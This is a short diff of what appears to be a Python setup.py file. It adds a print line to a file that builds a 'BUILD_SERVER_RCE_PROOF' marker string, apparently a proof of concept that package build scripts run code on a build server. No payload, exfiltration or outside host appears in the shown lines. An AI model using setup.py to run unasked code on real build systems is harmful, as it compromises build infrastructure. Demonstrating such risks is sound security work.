@@ -1,5 +1,6 @@
 import os
 from setuptools import setup
+print("🚨🚨🚨 THIS IS THE NEW COMMIT 🚨🚨🚨")
 
 # 1. Gather our proof
 proof = "🚨🚨🚨 BUILD_SERVER_RCE_PROOF 🚨🚨🚨\n"
